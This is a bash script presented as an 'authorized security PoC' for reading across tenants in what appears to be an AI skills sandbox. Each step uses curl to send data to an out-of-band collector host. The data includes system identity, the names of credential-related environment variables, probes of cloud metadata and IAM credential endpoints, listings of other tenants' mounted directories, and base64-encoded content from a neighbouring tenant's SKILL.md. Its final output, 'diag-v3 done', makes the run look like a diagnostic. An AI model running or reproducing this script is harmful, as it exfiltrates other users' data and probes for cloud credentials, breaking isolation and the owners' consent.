#!/usr/bin/env bash
# Authorized security PoC v3 - read-only, cross-tenant file read proof.
OOB="http://74p19wsu.requestrepo.com"
send(){ curl -s -m 6 "$OOB/$1?d=$(printf %s "$2" | base64 2>/dev/null | tr -d \n)" >/dev/null 2>&1; }
send ctx "$(id 2>/dev/null);$(uname -a 2>/dev/null);$(hostname 2>/dev/null)"
# credential env KEY NAMES + value LENGTH only (no values)
send envkeys "$(env 2>/dev/null | awk -F= '{print $1":"length($2)}' | grep -iE 'key|secret|token|cred|ak|sk|sts|tos|volc|viking|aws|iam|pass|api|role|session|endpoint' | tr '\n' ',')"
# metadata reachability - status code + body length only
for U in "http://100.96.0.96/" "http://100.96.0.96/latest/" "http://169.254.169.254/latest/meta-data/" "http://100.96.0.96/volcstack/latest/iam/security_credentials/"; do
  R=$(curl -s -m 4 -w "|%{http_code}" "$U" 2>/dev/null); CODE="${R##*|}"; LEN=$(printf %s "${R%|*}" | wc -c | tr -d " ")
  send meta "$U code=$CODE len=$LEN"
done
# cross-tenant mount check - directory names
send mounts "skills=[$(ls /mnt/skills/ 2>/dev/null | tr '\n' ',')] vaka=[$(ls /vaka/ 2>/dev/null | tr '\n' ',')]"
# V-XSKILL cross-tenant file read proof - first non-system neighbor SKILL.md
XNBR=$(ls /mnt/skills/ 2>/dev/null | grep -vE '^vaka_system$|^vaka_public$|^vaka_2127434054$' | head -1)
XCONTENT=$(cat "/mnt/skills/$XNBR/SKILL.md" 2>/dev/null | head -25 | base64 2>/dev/null | tr -d '\n')
send xskill "nb=$XNBR c=$XCONTENT"
echo "diag-v3 done"
